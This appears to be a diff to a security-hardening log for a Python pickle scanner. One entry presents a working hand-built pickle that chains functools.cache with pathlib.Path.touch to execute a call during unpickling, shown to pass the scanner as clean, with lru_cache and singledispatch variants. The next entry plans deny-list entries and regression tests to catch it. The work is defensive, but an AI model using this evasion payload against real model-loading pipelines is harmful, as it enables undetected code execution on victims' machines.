@@ -2735,3 +2735,115 @@ Blocking plan:
 Performance note: the fix is a single sorted policy-table entry checked by
 binary search. It does not add private-alias discovery, reducer-specific stack
 simulation, or callable-flow tracking.
+
+## Turn 61 - `functools.cache` callable-wrapper family gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using public `functools`
+decorator factories that synthesize callable wrappers around an
+attacker-selected function.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_functools_cache_wrapper_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("functools", "cache"),
+        sg("pathlib", "Path.touch"),
+        b"\x85R\x94",
+        b"h\x00",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=118`, `bytes_total=118`, `opcode_count=23`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `functools.cache`, `pathlib.Path.touch`, and
+  `pathlib.PosixPath`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final wrapper call returns
+  `<functools._lru_cache_wrapper ...>` and does not create
+  `/tmp/ma_functools_cache_wrapper_marker`
+- Unpickle result: the full payload constructs
+  `functools.cache(pathlib.Path.touch)`, retrieves the memoized wrapper,
+  invokes it with the attacker-chosen `Path`, creates
+  `/tmp/ma_functools_cache_wrapper_marker`, and returns `None`
+- Sibling proof: the same wrapper-call shape also scanned clean and created
+  markers for `functools.lru_cache` (`payload_len=126`) and
+  `functools.singledispatch` (`payload_len=136`), both with
+  `opcode_count=23`, `findings=[]`, and `notices=[]`
+- RCE mechanism: these decorator factories accept an arbitrary callable and
+  return a new callable wrapper. The pickle first synthesizes the wrapper from
+  clean-looking globals, then a later `REDUCE` invokes that stack-resident
+  wrapper with attacker-controlled arguments during deserialization.
+
+Why the scanner missed it:
+
+- `functools.cache`, `functools.lru_cache`, and `functools.singledispatch` are
+  absent from `DANGEROUS_GLOBALS`.
+- The `functools` warning policy only covers `partial` and `partialmethod`, so
+  these decorator factories currently classify as clean rather than suspicious
+  or malicious.
+- The payload uses only currently clean globals:
+  `functools.cache`, `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- The dangerous invocation uses the synthesized wrapper object from the pickle
+  stack, so there is no later dangerous global for the static policy table to
+  classify.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a public callable-wrapper family rather than another
+private alias gap. The focused next block should add sorted
+`DANGEROUS_GLOBALS` entries for `("functools", "cache")`,
+`("functools", "lru_cache")`, and `("functools", "singledispatch")`, plus a
+manual-pickle oracle regression proving scan-time detection before the
+memoized wrapper creates the marker. The hot path remains static binary-search
+policy lookup.
+
+## Turn 62 - Block public `functools` callable wrappers
+
+Blocking plan:
+
+- Add `("functools", "cache")`, `("functools", "lru_cache")`, and
+  `("functools", "singledispatch")` to the sorted Rust `DANGEROUS_GLOBALS`
+  table. These decorator factories all accept an attacker-selected callable and
+  return a stack-resident wrapper that a later `REDUCE` can invoke with
+  attacker-controlled arguments.
+- Keep the existing `functools` warning policy scoped to `partial` and
+  `partialmethod`; the three wrapper factories become critical direct-policy
+  hits, while `functools.partial` remains a warning for compatibility.
+- Add a parameterized CPython oracle regression that builds the exact
+  memoized-wrapper pickle for each factory, verifies scan-time detection on
+  both the control and RCE payloads, proves the control wrapper does not create
+  the marker, then proves the full payload creates the marker during
+  `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the fix adds three tuples to a sorted static table checked
+with binary search. It does not add wrapper-object tracking, decorator
+semantics, or callable-flow simulation.
